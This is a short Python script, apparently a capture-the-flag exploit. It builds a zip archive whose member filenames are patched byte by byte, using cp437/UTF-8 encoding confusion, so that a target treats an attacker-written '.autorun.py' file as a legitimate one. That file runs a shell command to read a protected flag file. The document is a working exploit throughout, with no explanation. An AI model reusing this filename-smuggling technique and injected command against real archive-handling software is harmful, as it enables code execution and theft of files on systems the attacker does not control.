import os 
prologue = b"sample"
signature = b".YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob1aiWrqxZqgHCPX4Nyc6WAQ.autorun.py"
xchars = b"XXYYZZ123"
new_xchars = b"\xd2\xa1YYZZ123"

xchars = b"XXYYZZ123"
new_xchars = b"\xd2\xa1YYZZ123"
xchars2 = b"WWWWWYYZZ123"
new_xchars2 = b"\xd2\xa1YYZZ123".decode('cp437').encode('utf8')
print(xchars2)
print(len(xchars2))
print(new_xchars2)
print(len(new_xchars2))

name = prologue + xchars + signature
name2 = prologue + xchars2 + signature
hi_name = prologue + new_xchars + signature

with open('orig.autorun.py','rb') as f:
    data = f.read()

with open(name,'wb') as f:
    f.write(data)

with open(name2,'wb') as f:
    f.write(b'print("WON")\n')
    f.write(b'import os\n')
    f.write(b'os.system("cat /home/user/flag")\n')

os.system(b"rm -f ar.zip")
os.system(b"zip ar.zip "+name+b" "+name2)

with open("ar.zip","rb") as f:
    data = f.read()
    data = data.replace(xchars, new_xchars)
    data = data.replace(xchars2, new_xchars2)

with open("ar.zip","wb") as f:
    f.write(data)

